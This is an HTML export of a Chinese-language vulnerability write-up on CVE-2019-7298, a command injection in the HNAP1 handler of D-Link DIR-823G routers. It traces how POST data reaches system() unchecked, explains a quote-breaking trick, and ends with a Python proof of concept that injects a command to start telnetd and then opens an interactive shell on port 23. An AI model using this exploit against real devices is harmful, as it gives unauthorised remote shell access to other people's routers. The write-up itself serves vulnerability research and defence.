<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X00955d540fc17e087a8e356aeebe872f5118c7a"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-7298</span><span class="csECDA2D3">）</span><span class="csDE05BCC">D-Link DIR-823G </span><span class="csECDA2D3">命令注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-Link DIR 823G 1.02B03</span><span class="cs9C1B1871">及之前的版本中存在命令注入漏洞，攻击者可通过发送带有</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">元字符的特制</span><span class="cs8926E06">/HNAP1</span><span class="cs9C1B1871">请求利用该漏洞执行任意的操作系统命令。在</span><span class="cs8926E06">HNAP API</span><span class="cs9C1B1871">函数处理请求之前，</span><span class="cs8926E06">system</span><span class="cs9C1B1871">函数执行了不可信的命令，触发该漏洞。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">D-Link DIR 823G 1.02B03</span><span class="cs9C1B1871">及之前的版本</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在每次内核启动之后将启动</span><span class="cs8926E06">init</span><span class="cs9C1B1871">进程，</span><span class="cs8926E06">init</span><span class="cs9C1B1871">进程的启动时根据</span><span class="cs8926E06">/etc/inittab</span><span class="cs9C1B1871">这个文件赖在不同运行级别启动相应的进程或执行相应的操作。其中</span><span class="cs8926E06">sysinit</span><span class="cs9C1B1871">代表系统的初始化，只有系统开机或重新启动的时候，后面对应的</span><span class="cs8926E06">process</span><span class="cs9C1B1871">才会执行一次。</span></p><p class="cs3A447A38"><span class="cs9FB05234">::sysinit:/etc/init.d/rcS</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">rcS</span><span class="cs9C1B1871">中，先执行一些列</span><span class="cs8926E06">mkdir</span><span class="cs9C1B1871">和设置，执行了</span><span class="cs9FB05234">goahead</span><span class="cs9C1B1871">。</span></p><p class="cs6FD73CFB"><span class="cs9FB05234">goahead</span><span class="cs8926E06"> </span><span class="cs9C1B1871">是一个开源的</span><span class="cs8926E06"> </span><span class="cs9FB05234">web</span><span class="cs8926E06"> </span><span class="cs9C1B1871">服务器，用户的定制性非常强。可以通过一些</span><span class="cs8926E06"> </span><span class="cs9FB05234">goahead</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> </span><span class="cs9FB05234">api</span><span class="cs9C1B1871">定义</span><span class="cs8926E06"> </span><span class="cs9FB05234">url</span><span class="cs9C1B1871">处理函数和可供</span><span class="cs8926E06"> </span><span class="cs9FB05234">asp</span><span class="cs8926E06"> </span><span class="cs9C1B1871">文件中调用的函数，具体可以看看官方的代码示例和网上的一些教程。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">goahead</span><span class="cs9C1B1871">的</span><span class="cs8926E06">websUrlHandlerDefine</span><span class="cs9C1B1871">函数允许用户自定义不同</span><span class="cs8926E06">url</span><span class="cs9C1B1871">的处理函数：</span></p><p class="cs3A447A38"><span class="cs9FB05234">websUrlHandlerDefine(T(&quot;/HNAP1&quot;), NULL, 0, websHNAPHandler, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">websUrlHandlerDefine(T(&quot;/goform&quot;), NULL, 0, websFormHandler, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">websUrlHandlerDefine(T(&quot;/cgi-bin&quot;), NULL, 0, websCgiHandler, 0);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">以上代表</span><span class="cs8926E06">/HNAP1</span><span class="cs9C1B1871">的请求交给</span><span class="cs8926E06">websHNAPHandler</span><span class="cs9C1B1871">函数处理，</span><span class="cs8926E06">/gofrom</span><span class="cs9C1B1871">的请求交给</span><span class="cs8926E06">websFormHandler</span><span class="cs9C1B1871">函数处理，</span><span class="cs8926E06">/cgi-bin</span><span class="cs9C1B1871">的请求交</span><span class="cs8926E06">websCgiHandler</span><span class="cs9C1B1871">函数处理。这些处理函数有统一的参数：</span></p><p class="cs3A447A38"><span class="cs9FB05234">int (*fn)(webs_t wp, char_t *url, char_t *path, char_t *query)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">wp &nbsp;&nbsp;&nbsp;Web server connection handle. &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url &nbsp;&nbsp;Request URL. &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">path &nbsp;Request path portion of the URL. &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">query Query string portion of the URL.</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先了解</span><span class="cs8926E06">/HNAP1</span><span class="cs9C1B1871">请求的处理函数，在</span><span class="cs8926E06">goahead</span><span class="cs9C1B1871">中查找</span><span class="cs8926E06">&ldquo;HNAP1&rdquo;</span><span class="cs9C1B1871">字符串并通过</span><span class="cs8926E06">xref</span><span class="cs9C1B1871">定位处理函数</span><span class="cs8926E06">sub_42383c</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2019-7298%ef%bc%89D-Link%20DIR-823G%20%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="199" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">sub_4238c</span><span class="cs9C1B1871">主要通过遍历全局的函数表来处理</span><span class="cs8926E06">HNAP1</span><span class="cs9C1B1871">接受的不同请求。</span><span class="cs8926E06">function_list</span><span class="cs9C1B1871">中每个元素的前四个字节为函数名，后四个字节为对应的函数地址。当找到在</span><span class="cs8926E06">function_list</span><span class="cs9C1B1871">中找到函数名与请求相同的字符串时，向</span><span class="cs8926E06">/var/hnaplog</span><span class="cs9C1B1871">中记录</span><span class="cs9FB05234">param_7</span><span class="cs9C1B1871">的值，这个值但从汇编不太能看出，</span><span class="cs8926E06"><a class="cs508254C" href="https://xz.aliyun.com/t/2834#toc-4"><span class="cs4B51D5E4">hackedbylh</span></a></span><span class="cs9C1B1871">指出是</span><span class="cs8926E06">post</span><span class="cs9C1B1871">的报文，在运行过程中查看</span><span class="cs8926E06">/var/hnaplog</span><span class="cs9C1B1871">能猜出来。之后调用对应的函数地址处理相关请求。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这里无论处理请求的函数名是什么，在找到之后会通过</span><span class="cs8926E06">snprintf</span><span class="cs9C1B1871">输入字符且未做检查，之后直接</span><span class="cs8926E06">system</span><span class="cs9C1B1871">执行，存在命令注入漏洞。如果</span><span class="cs8926E06">post</span><span class="cs9C1B1871">请求是</span><span class="cs8926E06">&#39;</span><span class="cs9FB05234">/bin/telnetd</span><span class="cs8926E06">&#39;</span><span class="cs9C1B1871">，就会先开启</span><span class="cs8926E06">telnet</span><span class="cs9C1B1871">服务器，再讲字符写入</span><span class="cs8926E06">hnaplog</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2019-7298%ef%bc%89D-Link%20DIR-823G%20%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="321" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="IOT安全/D-Link/%ef%bc%88CVE-2019-7298%ef%bc%89D-Link%20DIR-823G%20%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="513" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外需要注意，</span><span class="cs8926E06">post</span><span class="cs9C1B1871">的数据要加上引号，因为</span><span class="cs8926E06">echo &#39;%s&#39; &gt; /var/hnaplog</span><span class="cs9C1B1871">中本身带了单引号，如果只是</span><span class="cs9FB05234">/bin/telnet</span><span class="cs9C1B1871">，相当于</span></p><p class="cs3A447A38"><span class="cs9FB05234">echo &#39;`/bin/telnet`&#39; &gt; /var/hnaplog</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于命令由引号括起，会当做字符串处理，不会执行命令</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而</span></p><p class="cs3A447A38"><span class="cs9FB05234">echo &#39;&#39;`/bin/telnet`&#39;&#39; &gt; /var/hnaplog</span></p><p class="cs40DD2BC9"><span class="cs8926E06">post</span><span class="cs9C1B1871">中的两个引号分别与自带的两个引号组合，反引号没有嵌套在单引号中，会当做命令执行。</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from pwn import *</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">IP=&#39;192.168.0.1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">command =&quot;&#39;`/bin/telnetd`&#39;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">length = len(command)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">headers = requests.utils.default_headers()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Content-Length&quot;]=str(length)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;User-Agent&quot;] = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;SOAPAction&quot;] = &#39;&quot;http://purenetworks.com/HNAP1/Login&quot;&#39;#</span><span class="cs7FFD2630">此处的</span><span class="cs9FB05234">Login</span><span class="cs7FFD2630">可以替换为任何在</span><span class="cs9FB05234">function_list</span><span class="cs7FFD2630">中的函数名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Content-Type&quot;] = &quot;text/xml; charset=UTF-8&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Accept&quot;]=&quot;*/*&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Accept-Encoding&quot;]=&quot;gzip, deflate&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Accept-Language&quot;]=&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">payload = command</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(&#39;http://&#39;+IP+&#39;/HNAP1/&#39;, headers=headers, data=payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print r.text</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">p=remote(IP,23)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">p.interactive(</span></p></body>
</html>
